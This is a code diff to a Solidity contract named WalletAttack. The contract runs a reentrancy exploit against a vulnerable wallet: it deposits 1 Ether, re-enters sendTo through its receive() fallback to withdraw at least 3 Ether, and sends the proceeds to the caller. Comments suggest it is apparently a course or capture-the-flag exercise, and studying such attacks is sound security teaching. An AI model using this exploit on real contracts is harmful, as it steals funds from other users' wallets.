@@ -19,21 +19,34 @@ contract WalletAttack {
 
     }
 
-    function exploit(WalletI _target) public payable {
+    function exploit(WalletI target) public payable {
         // runs the exploit on the target wallet.
         // you should not deposit more than 1 Ether to the vulnerable wallet.
         // Assuming the target wallet has more than 3 Ether in deposits,
         // you should withdraw at least 3 Ether from the wallet.
         // The money taken should be sent back to the caller of this function)
+        _target = target;
         require(msg.value == 1 ether, "You must send exactly 1 ether");
         _target.deposit{value: 1 ether}();
-        _target.sendTo(payable(address(this)));
+        
+        exploit_env();
+        (bool success, ) = (payable (msg.sender)).call{value: address(this).balance}("");
+        require(success);
+    }
+
+    function exploit_env() public payable {
+        // runs the exploit on the target wallet.
+        // you should not deposit more than 1 Ether to the vulnerable wallet.
+        // Assuming the target wallet has more than 3 Ether in deposits,
+        // you should withdraw at least 3 Ether from the wallet.
+        // The money taken should be sent back to the caller of this function)
+        _target.sendTo(payable (address(this)));
     }
 
     receive () external payable {
         if (address(_target).balance >= 1 ether && receivedAmount < TARGET_AMOUNT) {
             receivedAmount += msg.value;
-            this.exploit(_target);
+            this.exploit_env();
         }
     }
 }
